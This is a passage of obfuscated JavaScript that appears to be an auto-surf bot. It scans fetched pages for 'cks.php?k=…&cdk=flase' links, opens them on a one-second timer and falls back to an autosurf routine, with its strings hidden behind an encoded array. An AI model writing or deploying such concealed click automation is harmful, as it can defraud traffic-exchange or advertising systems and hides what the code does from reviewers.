if(_0x5167x22[_0x1618[42]]==200)
{
msg[_0x1618[44]]=_0x1618[113];
_0x5167x1b[_0x1618[44]]=strip(_0x5167x22[_0x1618[43]]);
A=_0x5167x1b[_0x1618[35]](_0x1618[34]);
for(i=0;i<A[_0x1618[24]];i++)
{
try
{
if(A[i][_0x1618[5]][_0x1618[23]](/cks\.php\?k\=[0-9A-F]+\&cdk\=flase/)&&A[i][_0x1618[46]][_0x1618[46]][_0x1618[46]][_0x1618[35]](_0x1618[34])[0][_0x1618[68]]==_0x1618[69])
{
urls[urls[_0x1618[24]]]=A[i];
}
}
catch(e)
{
}
}
;
if(urls[_0x1618[24]])
{
msg[_0x1618[44]]=urls[_0x1618[24]]+_0x1618[114];
timer=setInterval(load,1000);
}
else 
{
msg[_0x1618[44]]=_0x1618[115];
autosurf();
}
}
else 
{
msg[_0x1618[44]]=_0x1618[63];
_0x5167x23();
}
}
}
catch(e)
{
msg[_0x1618[44]]=_0x1618[63];
_0x5167x23();
}
}
;
_0x5167x22[_0x1618[59]](_0x1618[58],_0x1618[116],true);
_0x5167x22[_0x1618[60]](null);
}
;
_0x5167x21=setInterval(function ()
{
if(_0x5167x1f<0)
{
clearInterval(_0x5167x21);
_0x5167x21=null;
msg[_0x1618[44]]=_0x1618[117];
_0x5167x23();
}
else 
{
msg[_0x1618[44]]=_0x1618[118]+_0x5167x1f+_0x1618[119];
_0x5167x1f--;
}
}
,1000);
}
;
if(urls[_0x1618[24]])
{
timer=setInterval(load,1000);
}
else 
{
autosurf();
}
}
,false);
}
}
else 
{
if(window[_0x1618[6]][_0x1618[5]][_0x1618[3]](_0x1618[121])>0)
{
document[_0x1618[124]](_0x1618[123])[0][_0x1618[122]]=_0x1618[125];
}
;
}
